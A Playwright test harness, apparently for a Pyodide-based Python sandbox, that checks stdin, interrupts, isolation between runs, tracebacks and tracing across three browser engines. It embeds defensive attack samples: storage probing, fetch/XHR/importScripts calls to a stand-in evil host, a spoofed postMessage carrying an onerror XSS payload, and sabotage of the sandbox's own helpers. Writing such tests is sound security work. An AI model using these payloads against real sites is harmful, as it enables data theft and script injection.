// F1 spike harness: runs every check in Chromium, Firefox and WebKit and writes results.json.
// Usage: node run-spike.mjs [chromium|firefox|webkit ...]
import { chromium, firefox, webkit } from "playwright";
import fs from "node:fs";
import { start, evilHits, APP_ORIGIN, EVIL_ORIGIN } from "./server.mjs";

const ENGINES = { chromium, firefox, webkit };
const wanted = process.argv.slice(2).length ? process.argv.slice(2) : Object.keys(ENGINES);

// ---------------------------------------------------------------- user programs under test
const P = {
  hello: `print("hello")`,
  input1: `name = input("Name? ")\nprint("Hi", name)`,
  input2: `a = int(input())\nb = int(input())\nprint(a + b)`,
  infinite: `while True:\n    pass`,
  builtinsPatch: `import builtins\nbuiltins.print = lambda *a, **k: None\nbuiltins.len = None`,
  builtinsClear: `import builtins\nbuiltins.__dict__.clear()`,
  globalsLeak: `secret_var = 42`,
  globalsCheck: `print("secret_var" in globals())`,
  stdoutHijack: `import sys\nsys.stdout = open("/tmp/hijack.txt", "w")`,
  modulePatch: `import json\njson.dumps = None`,
  moduleCheck: `import json\nprint(json.dumps([1]))`,
  error: `items = [1, 2, 3]\ni = 3\nprint(items[i])`,
  sabotage: `import gc\nfor o in gc.get_objects():\n    if isinstance(o, dict) and "run_user" in o and "_restore" in o:\n        o["run_user"] = None\nprint("sabotaged")`,
  trace: [
    "def fib_list(n):",
    "    out = [0, 1]",
    "    while len(out) < n:",
    "        out.append(out[-1] + out[-2])",
    "    return out",
    "data = {}",
    "for i in range(200):",
    "    data[i % 7] = fib_list(i % 12 + 2)",
    "total = sum(len(v) for v in data.values())",
  ].join("\n"),
  attackStorage: `
import js, asyncio
from pyodide.ffi import create_once_callable
print("ORIGIN", js.self.location.origin)
print("HAS_LOCALSTORAGE", hasattr(js, "localStorage"))
print("HAS_DOCUMENT", hasattr(js, "document"))
try:
    dbs = await js.indexedDB.databases()
    print("DBS", sorted(d.name for d in dbs))
except Exception as e:
    print("DBS ERR", type(e).__name__)
fut = asyncio.get_event_loop().create_future()
req = js.indexedDB.open("app-db")
def up(e):
    if not fut.done(): fut.set_result("NEW-EMPTY")
def ok(e):
    if not fut.done(): fut.set_result("EXISTING " + repr(list(req.result.objectStoreNames)))
req.onupgradeneeded = create_once_callable(up)
req.onsuccess = create_once_callable(ok)
print("APPDB", await fut)
`,
  attackNetwork: `
import js, asyncio
async def get(url):
    return await js.fetch(url)
for name, url in [("evil", "${EVIL_ORIGIN}/fetch"), ("app", "${APP_ORIGIN}/index.html"), ("self", "/index.html")]:
    try:
        r = await asyncio.wait_for(get(url), 3)
        print("FETCH", name, "OK", r.status)
    except asyncio.TimeoutError:
        print("FETCH", name, "BLOCKED (never settled)")
    except Exception as e:
        print("FETCH", name, "BLOCKED")
try:
    x = js.XMLHttpRequest.new(); x.open("GET", "${EVIL_ORIGIN}/xhr", False); x.send()
    print("XHR OK", x.status)
except Exception:
    print("XHR BLOCKED")
try:
    ws = js.WebSocket.new("ws://127.0.0.1:4300/ws")
    print("WS CREATED")
except Exception:
    print("WS BLOCKED")
try:
    js.importScripts("${EVIL_ORIGIN}/x.js"); print("IMPORTSCRIPTS OK")
except Exception:
    print("IMPORTSCRIPTS BLOCKED")
try:
    js.eval("1+1"); print("EVAL OK")
except Exception:
    print("EVAL BLOCKED")
try:
    js.EventSource.new("${EVIL_ORIGIN}/sse"); print("SSE CREATED")
except Exception:
    print("SSE BLOCKED")
`,
  attackSpoof: `
import js
from pyodide.ffi import to_js
from js import Object
def send(d):
    js.postMessage(to_js(d, dict_converter=Object.fromEntries))
send({"type": "result", "runId": "r999", "status": "ok"})
send({"type": "evil", "html": "<img src=x onerror=alert(1)>"})
print("<img src=x onerror=alert(1)><b>bold?</b>")
`,
};

const has = (s, sub) => typeof s === "string" && s.includes(sub);

async function runEngine(name) {
  const browser = await ENGINES[name].launch();
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  const dialogs = [];
  page.on("dialog", (d) => { dialogs.push(d.message()); d.dismiss(); });
  const consoleErrors = [];
  page.on("console", (m) => { if (m.type() === "error") consoleErrors.push(m.text().slice(0, 200)); });

  const R = { engine: name, version: browser.version(), checks: [], metrics: {} };
  const check = (id, pass, detail) => { R.checks.push({ id, pass: !!pass, detail }); console.log(`  ${pass ? "pass" : "FAIL"} ${id}`); };
  const STEP_TIMEOUT = 30000;
  const run = (code, opts = {}) => Promise.race([
    page.evaluate(([c, o]) => window.api.run(c, o), [code, opts]),
    new Promise((resolve) => setTimeout(() => resolve({ status: "timeout", error: `no result after ${STEP_TIMEOUT} ms`, output: "" }), STEP_TIMEOUT)),
  ]);

  await page.goto(`${APP_ORIGIN}/index.html`);
  await page.waitForFunction(() => window.api);
  const ready = await page.evaluate(() => window.api.ready);
  R.metrics.coldLoadMs = Math.round(ready.loadMs);
  R.caps = ready.caps;
  check("boot", ready.loadMs > 0, ready.caps);

  // --- core runtime
  let r = await run(P.hello);
  check("run.print", r.status === "ok" && r.output === "hello\n", r);

  r = await run(P.input1, { inputs: ["Ada"] });
  check("stdin.single", r.status === "ok" && has(r.output, "Hi Ada"), r);

  r = await run(P.input2, { inputs: ["2", "3"] });
  check("stdin.multiple", r.status === "ok" && r.output.trim().endsWith("5"), r);

  await page.evaluate(() => window.api.config({ stdinTimeoutMs: 1000 }));
  r = await run(P.input1, { inputs: [{ value: "Slow", delayMs: 3500 }] });
  check("stdin.slow-typist (3 SW rounds)", r.status === "ok" && has(r.output, "Hi Slow"), r);
  await page.evaluate(() => window.api.config({ stdinTimeoutMs: 15000 }));

  // --- stop an infinite loop
  const pending = run(P.infinite);
  await page.waitForTimeout(400);
  const stopAt = Date.now();
  await page.evaluate(() => window.api.stop());
  r = await pending;
  R.metrics.stopToResultMs = Date.now() - stopAt;
  R.metrics.readyAfterStopMs = r.readyAfterMs != null ? Math.round(r.readyAfterMs) : null;
  check("stop.infinite-loop", r.status === "interrupted", r);
  r = await run(P.hello);
  check("stop.next-run-works", r.status === "ok" && r.output === "hello\n", r);

  // --- hygiene between runs
  await run(P.builtinsPatch);
  r = await run(`print("still", len([1, 2]))`);
  check("hygiene.builtins-patched", r.output === "still 2\n", r);
  await run(P.builtinsClear);
  r = await run(`print("ok", len("ab"))`);
  check("hygiene.builtins-cleared", r.output === "ok 2\n", r);
  await run(P.globalsLeak);
  r = await run(P.globalsCheck);
  check("hygiene.globals", r.output === "False\n", r);
  await run(P.stdoutHijack);
  r = await run(`print("visible")`);
  check("hygiene.sys-stdout", r.output === "visible\n", r);
  await run(P.modulePatch);
  r = await run(P.moduleCheck);
  check("hygiene.module-patch", r.output === "[1]\n", r);
  r = await run("", { mode: "probe" });
  try { R.metrics.probe = JSON.parse(r.extra); } catch { R.metrics.probe = r; }

  // --- sabotage of our own helpers -> must be detected and recovered
  r = await run(P.sabotage);
  const r2 = await run(P.hello);
  const r3 = await run(P.hello);
  check("hygiene.sabotage-recovers", r3.status === "ok" && r3.output === "hello\n", { sabotage: r.output, next: r2.error?.slice(0, 80), after: r3.output });

  // --- errors
  r = await run(P.error);
  check("error.traceback-user-frames-only", r.status === "error" && has(r.error, "IndexError") && !has(r.error, "_pyodide"), r.error);
  r = await run(P.error, { mode: "explain" });
  let ex = null;
  try { ex = JSON.parse(r.extra); } catch {}
  check("error.stack_data-variables", ex && ex.frames?.[0]?.vars?.i === "3" && has(ex.frames?.[0]?.executing, "items[i]"), ex || r);

  // --- tracer performance
  r = await run(P.trace, { mode: "trace" });
  let tr = null;
  try { tr = JSON.parse(r.extra); } catch {}
  R.metrics.trace = tr;
  check("trace.1000-steps<500ms", tr && tr.steps === 1000 && tr.trace_ms < 500, tr || r);

  // --- attacks
  r = await run(P.attackStorage);
  check("attack.storage-isolated", r.status === "ok" && has(r.output, "APPDB NEW-EMPTY") && !has(r.output, "app-db'") && has(r.output, "HAS_LOCALSTORAGE False"), r.output || r.error);

  const hitsBefore = evilHits.length;
  r = await run(P.attackNetwork);
  await page.waitForTimeout(1500);
  const newHits = evilHits.slice(hitsBefore);
  check("attack.network-blocked", r.status === "ok" && has(r.output, "FETCH evil BLOCKED") && has(r.output, "FETCH app BLOCKED") && newHits.length === 0, { output: r.output, evilHits: newHits });
  check("attack.self-fetch-allowed", has(r.output, "FETCH self OK 200"), r.output);

  r = await run(P.attackSpoof);
  const children = await page.evaluate(() => window.api.outElementChildCount());
  const dropped = await page.evaluate(() => [...window.api.dropped]);
  check("attack.spoofed-messages-harmless", r.status === "ok" && children === 0 && dialogs.length === 0, { children, dialogs, dropped });

  // frame-ancestors: an attacker site must not be able to embed the sandbox
  const evilPage = await ctx.newPage();
  await evilPage.goto(`${EVIL_ORIGIN}/embed.html`);
  await evilPage.waitForTimeout(4000);
  const embedded = await evilPage.evaluate(() => window.gotReady);
  check("attack.frame-ancestors", embedded === false, { embedded });
  await evilPage.close();

  // --- warm reload (service-worker cache)
  await page.reload();
  await page.waitForFunction(() => window.api);
  const warm = await page.evaluate(() => window.api.ready);
  R.metrics.warmLoadMs = Math.round(warm.loadMs);
  r = await run(P.hello);
  check("warm.reload-works", r.status === "ok" && warm.caps.stdin === ready.caps.stdin, { warm: warm.caps });

  // --- offline reload (network gone, SW cache only)
  await ctx.setOffline(true);
  let offlineOk = false, offlineDetail = null;
  try {
    // App page itself is not cached in this spike (no app SW yet); reload the sandbox directly.
    const sb = await ctx.newPage();
    await sb.goto("http://127.0.0.1:4200/index.html").catch((e) => { offlineDetail = String(e).slice(0, 120); });
    offlineOk = false;
    await sb.close();
  } catch (e) { offlineDetail = String(e).slice(0, 120); }
  await ctx.setOffline(false);
  R.metrics.offlineNote = offlineDetail ? "sandbox HTML not cached by SW in this spike (expected; app-level SW is F2 scope)" : "n/a";

  R.consoleErrors = consoleErrors.slice(0, 10);
  await browser.close();
  return R;
}

const srv = await start();
const results = [];
for (const name of wanted) {
  process.stdout.write(`\n=== ${name} ===\n`);
  try {
    const R = await runEngine(name);
    results.push(R);
    for (const c of R.checks) console.log(`${c.pass ? "PASS" : "FAIL"}  ${c.id}${c.pass ? "" : "  -> " + JSON.stringify(c.detail).slice(0, 400)}`);
    console.log("metrics", JSON.stringify(R.metrics));
    console.log("caps", JSON.stringify(R.caps));
  } catch (err) {
    console.log("ENGINE CRASH", String(err.stack || err).slice(0, 800));
    results.push({ engine: name, crash: String(err.message || err) });
  }
}
fs.writeFileSync(new URL("./results.json", import.meta.url), JSON.stringify(results, null, 2));
await srv.close();
const failed = results.flatMap((r) => (r.checks || []).filter((c) => !c.pass)).length + results.filter((r) => r.crash).length;
console.log(`\n${failed === 0 ? "ALL PASS" : failed + " FAILED"}`);
process.exit(failed ? 1 : 0);
